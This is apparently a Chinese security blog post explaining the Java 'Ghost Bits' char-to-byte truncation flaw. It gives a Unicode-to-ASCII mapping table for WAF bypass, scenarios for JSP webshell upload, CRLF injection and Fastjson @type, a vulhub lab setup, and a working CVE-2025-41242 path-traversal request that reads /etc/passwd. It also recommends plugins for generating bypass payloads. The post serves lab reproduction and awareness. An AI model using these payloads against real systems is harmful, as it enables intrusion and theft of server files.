---
title: java幽灵比特位(Ghost Bits)漏洞介绍&amp;&amp;相关测试工具推荐
url: https://mp.weixin.qq.com/s/msdwMk-QFmStSpWroE1Nhg
source: Doonsec's feed
date: 2026-05-03
fetch_date: 2026-05-04T05:28:05.709374
---

# java幽灵比特位(Ghost Bits)漏洞介绍&amp;&amp;相关测试工具推荐

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboRUlgSWWg52dibeHlDTCk3V6xPJ1NvqNG3picvS7J0vJOoHuQVEh4K2Ccey25kiaymbaWBbN6KZLYybwvJKWYXWPBHGSZUb77E62Y/0?wx_fmt=jpeg)

# java幽灵比特位(Ghost Bits)漏洞介绍&&相关测试工具推荐

原创

陌笙
陌笙

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

## 一、漏洞概述

Ghost Bits（幽灵比特位）是 Black Hat Asia 2026 上正式披露的一类 Java 生态底层安全缺陷。**该问题不是某个具体组件的实现错误，而是源于 Java 语言中 `char` 与 `byte` 类型之间窄化转换（Narrowing Conversion）的“静默截断”行为**引发的架构级安全风险。

这个漏洞的核心危害在于：**安全检测链路（WAF/IDS）与应用执行链路对同一输入的解析语义不一致**——前置防护看到的是“无害”的 Unicode 字符，而后端执行时却恢复为危险 ASCII 攻击载荷。

该漏洞影响范围极广，涉及 Tomcat、Jetty、Spring、Fastjson、Jackson、Openfire 等大量主流 Java 框架与中间件。

## 二、技术原理

### 2.1 根本原因：char 与 byte 的位数差异

Java 中两个基础类型的位宽差异是“幽灵比特位”的根源：

| 类型 | 位宽 | 范围 |
| --- | --- | --- |
| `char` | 16 位（2 字节） | 0x0000 ~ 0xFFFF（无符号） |
| `byte` | 8 位（1 字节） | -128 ~ 127（有符号） |

当代码中出现以下高危写法时，极大概率会触发 Ghost Bits 转化：

java

```
// 模式 1：显式强制类型转换
byte b = (byte) ch;

// 模式 2：位运算掩码（仅保留低 8 位）
int v = ch & 0xFF;

// 模式 3：流写入（只写低 8 位）
baos.write(ch);              // ByteArrayOutputStream
out.write(ch);               // OutputStream.write(int)
dos.writeBytes(str);        // DataOutputStream

// 模式 4：部分已废弃 API
String.getBytes(int, int, byte[], int);
RandomAccessFile.writeBytes();
URLDecoder.decode();
```

### 2.2 常见 Ghost Bits 映射表（红队武器库）

攻击者可以**选择高 8 位任意、低 8 位固定为特定危险 ASCII 的 Unicode 字符**，实现对任意危险字符的“隐身化”。

| 目标字节 | Hex | 危险语义 | 示例 Ghost Bits 字符 | Unicode |
| --- | --- | --- | --- | --- |
| `.` | 0x2E | 路径穿越、文件扩展名分隔 | 阮 | U+962E |
| `/` | 0x2F | 目录分隔符 | 丯 | U+4E2F |
| `%` | 0x25 | URL 编码标识 | 严 | U+4E25 |
| `u` | 0x75 | URL 编码 `%u` 前缀 | 灵 | U+7075 |
| `0` | 0x30 | 数字相关绕过 | 丰 | U+4E30 |
| `2` | 0x32 | 数字相关绕过 | 甲 | U+7532 |
| `j` | 0x6A | JSP 扩展名 | 陪 | U+966A |
| `@` | 0x40 | Fastjson `@type` | 乀 | U+4E40 |
| `\r` | 0x0D | CRLF 注入 | 瘍 | U+760D |
| `\n` | 0x0A | CRLF 注入 | 瘊 | U+760A |

## 三、典型攻击场景

### 3.1 WAF 绕过——最广泛的危害

由于每个危险 ASCII 字符都对应**大量**可选的 Unicode 字符（高 8 位任意），WAF 几乎不可能通过黑名单穷举防御。统计显示：

```
仅 CJK 基本汉字区（U+4E00 ~ U+9FFF）：
- 能映射成 '.' 的汉字：82 个
- 能映射成 '/' 的汉字：82 个

构造 '../' 的组合数：82 × 82 × 82 = 551,368 种
WAF 无法全部拦截[citation:8]
```

### 3.2 文件上传绕过——1.陪sp → 1.jsp

**场景**：Tomcat 解析 `filename*` 时使用 `out.write((byte) c)` 直接截断

```
攻击者上传文件：1.陪sp

WAF 检查：看到 ".陪sp" → 不是 .jsp → 放行

Tomcat 处理：
- '陪' (U+966A) → (byte) 转换 → 0x6A → 'j'
- 最终保存为：1.jsp ✓

结果：WebShell 成功落地[citation:6][citation:9]
```

### 3.3 路径穿越——阮严灵丰丰甲来 → .%u002e → ../

**场景**：Spring + Jetty 因 URI 解码逻辑不一致导致的漏洞（CVE-2025-41242）

```
攻击者输入：阮严灵丰丰甲来

Spring 侧 decode 处理：
- 逐字符 (byte) 转换 → . % u 0 0 2 e
- 拼装为：.%u002e

Jetty 侧解析：
- %u002e 被识别为 URL 编码 → 解码为 '.'

组合效果：.%u002e 前一个 '.' + 后解码的 '.' = '..'（路径穿越）[citation:4]
```

### 3.4 CRLF 注入——瘍瘊 → \r\n

**场景**：SMTP 协议写入、HTTP 响应头拼接

```
字符序列：瘍 瘊
低 8 位：0x0D、0x0A
折叠后：\r\n（CRLF）

可注入效果：
- SMTP：添加恶意邮件头
- HTTP：响应拆分攻击
- Redis：协议命令注入
```

### 3.5 JSON 解析绕过——Fastjson / Jackson

**场景**：`Character.digit()` 接受 Unicode 数字字符，WAF 看到的是非 `@type` 字符串

```
{
  "\u꘠๐๔੦type": "..."
}
```

WAF 看到的是乱码，Fastjson 仍可能解析出 `@type` 键名。

环境搭建

```
我这里直接使用centos7+vulhub进行复现的https://blog.csdn.net/kalilinuxsafe/article/details/145051110
```

相关问题解决

拉取镜像超时

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSPUfeLTWrgW5WGoaDo24YBLA1fWQ6GTuxicmLiaZ4AwKmCYuzetxv9WibxmfCpJiavxKicbTOYx0UOTOOof4rDER6fic8FTlFWQfK94/640?wx_fmt=png&from=appmsg)

配置镜像加速器解决

```
在终端执行以下命令：sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json <<-'EOF'{  "registry-mirrors": [    "https://docker.1ms.run",    "https://docker.xuanyuan.me",     "https://docker.m.daocloud.io",    "https://hub-mirror.c.163.com",    "https://mirrors.tuna.tsinghua.edu.cn"  ]}EOF
重启Docker服务sudo systemctl daemon-reloadsudo systemctl restart docker
验证配置生效docker info | grep -A 1 "Registry Mirrors"检查DNS配置（偶发情况）
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf重新拉取镜像docker-compose up -d
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSfv45YV07vJ9bZKZc0odUFMQiaEgql7AEbKuyVMbzRurxHRQiczHLLehWicTDp8rbDRsnTuFwz3jwbdicAyOj1jxwjDZEs7WJykmU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTBsIIiaYIssXwf6Hh89p7TCC9t9tKUgr8ianSEKBTp6jUtoU1bib9KBJKr9CK5VpQK7Z9yI42RVDhYakbbibwIZtqtuElFMD4B834/640?wx_fmt=png&from=appmsg)

然后直接查看ip(ifconfig)以及对应的端口进行访问

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS8LzpJ3kgv9qOONEwjWnl4NXQeWzXVuoic9gFQodtxewIOzFSmzqajF7p7ZjKo1u4ibEw4YFYWvialO8DohVDDC8W9kL8OaOO88Y/640?wx_fmt=png&from=appmsg)

vi docker-compose.yml

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQSiceOTPmQCicV0sjbiaiaXhjhu5qZhvnNHjib2YOh6Pib0ttCXSZY4548MYIDBKnl5liayWO9wNiaOficgDaqaYaVSpMXH6rYE6UpEqGk/640?wx_fmt=png&from=appmsg)

直接访问

```
http://192.168.250.128:8080
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS6hvoTYJDuPgNMrAicaMFIIq2zjoSRggp81EKolOFx6V9s2rfOkWxECGiaC7EEmS8xcq7MZdp2nAS1QTvVPDUB4a7RATMpwk07Y/640?wx_fmt=png&from=appmsg)

出现这个说明搭建成功

## Spring框架因Jetty URI解析不一致导致的路径穿越漏洞（CVE-2025-41242）

Spring框架是Java生态中应用最广泛的应用框架之一，Jetty是Spring Boot应用常用的内嵌HTTP服务器。CVE-2025-41242是一个由Spring框架与Jetty之间URI解码不一致所导致的路径穿越漏洞。

具体原理以及相关利用可以看这个

https://github.com/vulhub/vulhub/blob/master/spring/CVE-2025-41242/README.md

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQdYwdD1LC4Qqkic1gHl3DpndWTgbCVcGa1R6hbWpAINtLmPZaK4YicmBlBNib2nwSSnkERTTiagpTI297Xq13vad9Cm9OaDkLMn9w/640?wx_fmt=png&from=appmsg)

## poc

```
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1Host: your-ip:8080Connection: close
```

这个如果使用burp来复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRJtwqhiarfLaSicWGaPOeZD8gA5GjY0mwI1Mu62WiaWMdcQL5KlUBXnBbJq0ev9BLntjjuqeHrmMY0CSKH3FWOapS9oqHsuhjwck/640?wx_fmt=png&from=appmsg)

```
会将我们的字符阮严灵丰丰甲来转换成这个.%u002e导致无法复现成功
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQD9W1pwcfUg2TcBcXxMRr01ezHDzic8w6JcwgQOehTaKmzIHlq5l8GwUNT80IduIOXxEpr0bwS7CkttBpcKbgbNvDRibQskHpsM/640?wx_fmt=png&from=appmsg)

前两天看到了这个插件

工具地址

https://github.com/AugustineFulgur/GhostBitsGenerator

原理

```
GhostBitsGenerator 利用 Java 在处理数据流时常见的 (byte)char 强制类型转换缺陷，将攻击载荷（如 SQLi 或 RCE 指令）隐藏在高位 Unicode 字符中。
该工具的核心价值在于构造“语义视差”：通过生成特定的高位字符，使 Payload 在流经 WAF 时表现为无害的国际化文本，成功规避特征码匹配；而一旦载荷进入后端的 Java 业务逻辑，利用其高位截断的特性，Payload 会在内存中“还原”为原本的攻击指令。说白了就是：绕WAF神器！
使用方式：安装插件后 – 选中需要转换的字节 – 右键 – 插件 – Ghost Bits Generator – Generate Ghost Bits，转换后可能显示异常，这是正常现象，正常发包即可，在这个漏洞下，使用幽灵比特位转化的特殊字符无法正常显示是正常的。
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQJ6OaqhvMhJSM14cZbSKaX00xU4ERvP79hiaNUgJaAWicJWqzMVzLsrgfpmtyLgeB5IY1eiatbvic3pSFmaibyK5HafH9IsIemSkDo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSqA8YAuCVN2MzBToEmEdrXJTTria12xzaJVFR9aNYvib8G6O71iaOjrUoPw5bkmfgibZsbSicUQEXYHSyiaghefpKGUQ0B8OFkXlpRk/640?wx_fmt=png&from=appmsg)

看起来挺好用的，在这里尝试一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSibSTic5YWDxXYAs2Oqljh8kY2tpbPXP1iaiaCmeSdMus0oqxyba8LsezxV2uWUB22c4nCG1p3E5MVrz2qpcicws4rzYoD0MwrrqpI/640?wx_fmt=png&from=appmsg)

好像也不太行,可能是打开方式不对，等会在试试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRBZrAqD8icJuwDh8yibDHFqgibCItN4jVGNeF6903HWCHCiasd6aM43VicquAHYWens9ZBrt8Ribyh8iaaUqMMaI0xaxQI4W3FvCeqfE/640?wx_fmt=png&from=appmsg)

这里直接使用yakit可以轻松复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTK9xmIicceXC7gicE1wHWlIFl528Qcc0UIllZFyDS2PM1yek9Tk5iaYAcwWuP7eJNbq2DfFwKmicdl6DnNGXgCw5diaSMFPP1VnQyg/640?wx_fmt=png&from=appmsg)

也可以使用yakit的插件，插件仓库里面直接搜索ghost

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRnS9IicNSU8gMIjPRTghjEP7g1n5bYuicy721lgfEWbWBTL8O7nYXZAqiaBQLsX9bFXOT3WjUzn0ucfwticibRbs0ZTHBVibBJCSNv4/640?wx_fmt=png&from=appmsg)

选择第一个进行下载测试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRh4eMlGrzZbb6BmIvTMLyIIDlrzt3jsrjrk3d9o58jXVR5pu7E8Z8qF7xe2iaR1iahTPiaNBYXlicESMibw9tyXITOVcKzKbHAXRAY/640?wx_fmt=png&from=appmsg)

可以看到有多种攻击场景，针对当前，我们直接选择CVE-2025-41242这个

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1OSbwZXLzHCz6p3icpSRCcnK4IpPIALztToVgC71P4MQE7BblI34HE6Fsic2dBHc2qLzs6HTy4l2gfsNxzyCeS0vyuKxeR4yHg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSD...